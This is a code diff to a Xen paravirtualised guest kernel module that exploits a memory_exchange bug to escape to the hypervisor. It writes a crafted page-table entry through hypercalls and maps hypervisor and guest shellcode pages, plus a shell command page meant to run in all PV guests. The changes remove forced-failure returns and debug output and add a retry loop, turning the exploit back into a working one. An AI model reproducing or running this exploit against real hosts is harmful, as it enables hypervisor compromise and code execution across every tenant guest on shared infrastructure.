@@ -26,9 +26,6 @@ void backstop_85_handler(void);
 #define PHYSICAL_PMD_PAGE_MASK_  (((signed long)PMD_PAGE_MASK) & __PHYSICAL_MASK)
 #define PHYSICAL_PUD_PAGE_MASK_  (((signed long)PUD_PAGE_MASK) & __PHYSICAL_MASK)
 
-#define __mfn(_v) ((unsigned long) (arbitrary_virt_to_machine(_v).maddr >> PAGE_SHIFT))
-#define __machine_addr(_v) ((unsigned long) arbitrary_virt_to_machine(_v).maddr)
-
 struct xen_memory_reservation {
     u64 extent_start;
     u64 nr_extents;
@@ -68,7 +65,6 @@ static int init_test(void) {
     return -EINVAL;
   }
 
-  slow_print("fishishing the init_test\n");
   return 0;
 }
 
@@ -90,11 +86,7 @@ static int dealloc_with_last_byte(u8 val) {
     }
 
     // Remove reference to the page.
-    ret = HYPERVISOR_update_va_mapping((unsigned long)victim_page_virt, VOID_PTE, 0);
-    if (ret != 0) {
-      slow_print("Error on uptatng the va_mapping in dealloc_with_last_byte() failed with %d\n", ret);
-      return ret;
-    }
+    HYPERVISOR_update_va_mapping((unsigned long)victim_page_virt, VOID_PTE, 0);
 
     // Push the page on the domheap by exchanging it for a different one.
     // This calls XENMEM_exchange with legitimate arguments; the bug is triggered
@@ -140,16 +132,9 @@ static int try_write_byte_hyper(u8 *dst, u8 val) {
   if (!victim_page_virt) return 1;
   in_extent = virt_to_mfn(victim_page_virt);
 
-  slow_print("dst addr = %p\n", dst);
-  slow_print("target_addr = %p\n", (void*) target_addr);
-
   // We need to do this to make steal_page() in memory_exchange() work.
   // Equivalent to xen_zap_pfn_range(victim_page_virt, 0, NULL, NULL).
-  ret = HYPERVISOR_update_va_mapping((unsigned long)victim_page_virt, VOID_PTE, 0);
-  if (ret){
-      slow_print(" failed to update the victim_page_virt hypercall returns 0x%lx\n", ret);
-      return 1;
-  }
+  HYPERVISOR_update_va_mapping((unsigned long)victim_page_virt, VOID_PTE, 0);
 
   nr_exchanged = (target_addr - out_extent_base_addr) / 8;
   nr_extents = nr_exchanged + 1;
@@ -181,29 +166,13 @@ static int try_write_byte_hyper(u8 *dst, u8 val) {
 }
 
 static int write_byte_hyper(u8 *dst, u8 val) {
-    int count =0;
-    slow_print("write_byte_hyper(%p, 0x%hhx)\n", dst, val);
-    slow_print("write_byte_hyper(0x%hhx, 0x%hhx)\n", ACCESS_ONCE(*dst), val);
-
-    /*
-    while (ACCESS_ONCE(*dst) != val && count < 2 ) {
-        slow_print("write_byte_hyper(%p, 0x%hhx)\n", dst, val);
-        slow_print("write_byte_hyper(0x%hhx, 0x%hhx)\n", ACCESS_ONCE(*dst), val);
-        count++;
-        if (try_write_byte_hyper(dst, val))
-            return 1;
-    }
-    */
-        if (try_write_byte_hyper(dst, val))
-            return 1;
-
-    slow_print("write_byte_hyper(%p, 0x%hhx)\n", dst, val);
-    slow_print("write_byte_hyper(0x%hhx, 0x%hhx)\n", ACCESS_ONCE(*dst), val);
-
-
-    slow_print("write_byte_hyper successful\n");
-    slow_print(" forcing error\n"); return 1;
-    return 0;
+  slow_print("write_byte_hyper(%p, 0x%hhx)\n", dst, val);
+  while (READ_ONCE(*dst) != val) {
+    if (try_write_byte_hyper(dst, val))
+      return 1;
+  }
+  slow_print("write_byte_hyper successful\n");
+  return 0;
 }
 
 /*
@@ -226,15 +195,9 @@ static int set_pud_entry(pud_t *pud, u64 pmd_phys_addr) {
      * set the present bit for this entry. */
     0
   };
-  printk("PUD (%p - 0x%lx) val = 0x%lx, \t(flags = %s)\n", pud, __machine_addr(pud), *(unsigned long*) pud,  (pud_present(*pud)) ? "P" : "");
-
-  slow_print("pmd_phys_addr : %llx\n", pmd_phys_addr);
-  slow_print("crafted_pud_entry  :  %llx\n", *(uint64_t*)crafted_pud_entry);
   *(uint64_t*)crafted_pud_entry |= pmd_phys_addr;
-  slow_print("crafted_pud_entry |= pmd_phys_addr  :  %llx\n", *(uint64_t*)crafted_pud_entry);
 
-
-  slow_print("### trying to write crafted PUD entry: %ld\n",sizeof(crafted_pud_entry));
+  slow_print("### trying to write crafted PUD entry...\n");
   for (i = 0; i < sizeof(crafted_pud_entry); i++) {
     slow_print("### writing byte %d\n", i);
     if (write_byte_hyper(((u8*)pud) + i, crafted_pud_entry[i])) {
@@ -243,8 +206,6 @@ static int set_pud_entry(pud_t *pud, u64 pmd_phys_addr) {
     }
   }
   slow_print("### crafted PUD entry written\n");
-  slow_print("###   Forcing failure\n");
-  return 1;
   return 0;
 }
 
@@ -413,16 +374,13 @@ static void cleanup_test(void) {
   u8 *scratch_vaddr;
 
   pgd_t *user_pgd = pgd_offset(current->mm, 0x0000600040000000);
-  pud_t *user_pud = pud_offset(user_pgd,    0x0000600040000000);
-
+  pud_t *user_pud = pud_offset(user_pgd, 0x0000600040000000);
 
   /* allocate remaining levels of tables */
   u8 *hv_shellcode_page = (void*)__get_free_pages(GFP_KERNEL, 0);
   u8 *user_shellcode_page = (void*)__get_free_pages(GFP_KERNEL, 0);
   u64 *my_pmd = (void*)__get_free_pages(GFP_KERNEL, 0);
   u64 *my_pt = (void*)__get_free_pages(GFP_KERNEL, 0);
-
-  slow_print("/* allocate remaining levels of tables */ok!\n");
 
   if (!hv_shellcode_page || !user_shellcode_page || !my_pmd || !my_pt) {
     slow_print("OOM");
@@ -440,43 +398,27 @@ static void cleanup_test(void) {
   slow_print("PML4 at %p\n", current->mm->pgd);
   slow_print("PML4 entry: 0x%lx\n", (unsigned long)pgd_val(*pgd_offset(current->mm, MY_SECOND_AREA)));
 
-
-  slow_print("/* link my_pt in my_pmd */\n");
+  /* link my_pt in my_pmd */
   my_pmd[0] = (0x7 | virt_to_machine(my_pt).maddr);
 
-  slow_print("/* map target PUD as entry 0, for writing from the guest */\n");
+  /* map target PUD as entry 0, for writing from the guest */
   my_pt[0] = (0x7 | ((unsigned long) /*pgd_val*/(*pgd_offset(current->mm, MY_SECOND_AREA)).pgd & PTE_PFN_MASK));
-
-  slow_print("/* map HV shellcode page as entry 1, for RWX access from ring 0 (W for inline BSS) */\n");
+  /* map HV shellcode page as entry 1, for RWX access from ring 0 (W for inline BSS) */
   my_pt[1] = (0x3 | virt_to_machine(hv_shellcode_page).maddr);
-  
-  slow_print("/* map 64bit guest shellcode page as entry 2, for RX access from ring 3 */\n");
+  /* map 64bit guest shellcode page as entry 2, for RX access from ring 3 */
   my_pt[2] = (0x5 | virt_to_machine(user_shellcode_page).maddr);
-
-  slow_print("/* map our userspace PUD as entry 3, for writing from the guest, so we can\
-          * cleanly undo the initial PUD mapping */\n");
+  /* map our userspace PUD as entry 3, for writing from the guest, so we can
+   * cleanly undo the initial PUD mapping */
   my_pt[3] = (0x7 | (virt_to_machine(user_pud).maddr & ~0xfffUL));
-
-
-  slow_print("/* map kernel PML4 as entry 4, for writing from the guest (to grant guest access to PML4:261) */\n");
+  /* map kernel PML4 as entry 4, for writing from the guest (to grant guest access to PML4:261) */
   my_pt[4] = (0x7 | virt_to_machine(current->mm->pgd).maddr);
-
-  slow_print("/* map target PUD for MY_THIRD_AREA as entry 5, for writing from the guest */\n");
+  /* map target PUD for MY_THIRD_AREA as entry 5, for writing from the guest */
   my_pt[5] = (0x7 | ((unsigned long) /*pgd_val*/(*pgd_offset(current->mm, MY_THIRD_AREA)).pgd & PTE_PFN_MASK));
-  
-
-
-  slow_print("/* shell command to run in all PV guests */\n");
+  /* shell command to run in all PV guests */
   my_pt[6] = (0x5 | virt_to_machine(shell_command_page).maddr);
 
-
   /* set up temporary mapping through a guest userspace address */
-  if (set_pud_entry(user_pud, virt_to_machine(my_pmd).maddr)){
-    slow_print("Failed in setting the pud_entry!\n");
-    return;
-  }
-  return;
-  
+  set_pud_entry(user_pud, virt_to_machine(my_pmd).maddr);
   barrier();
 
   /* put a reference to our PMD into the target PUD */
